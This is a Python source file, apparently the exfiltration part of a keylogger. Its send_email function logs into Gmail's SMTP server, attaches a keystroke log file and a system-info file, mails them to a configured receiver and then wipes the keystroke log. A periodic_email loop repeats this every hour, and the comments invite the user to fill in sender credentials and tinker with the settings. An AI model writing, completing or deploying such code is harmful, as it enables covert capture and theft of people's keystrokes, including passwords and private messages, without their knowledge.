from email.message import EmailMessage
import ssl
import smtplib
import threading, time # For sending email every 60 seconds (for periodic_email)

key_info = "key_log.txt" # text file for key presses
sys_info = "sys_info.txt" # text file for os info 

#These varibals are for the email section, tinker with them for your needs.
email_sender = "" #email that will be sending the logs
email_pass = "" # app password from email sender gmail. (find in security settings)
email_receiver = "" #email that will receieve the log
subject = "email" #Name of the email
body = """information"""

# Function to send email with the logs attached
def send_email():
    em = EmailMessage()
    em['From'] = email_sender
    em['To'] = email_receiver
    em['Subject'] = subject
    em.set_content(body)

    context = ssl.create_default_context()
    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
        smtp.login(email_sender, email_pass)
        with open(key_info, "r") as logKey:
            em.add_attachment(logKey.read(), filename=key_info)
        with open(sys_info, "r") as logSys:
            em.add_attachment(logSys.read(), filename=sys_info)
        smtp.send_message(em)
    with open(key_info, "w") as logKey: # Clear log file after sending email
        pass


# Function send email every hour (change int for different times, ex: 120 for 2 minutes)
import threading, time
def periodic_email(interval_seconds: int = 3600):
    while True:
        send_email()
        time.sleep(interval_seconds)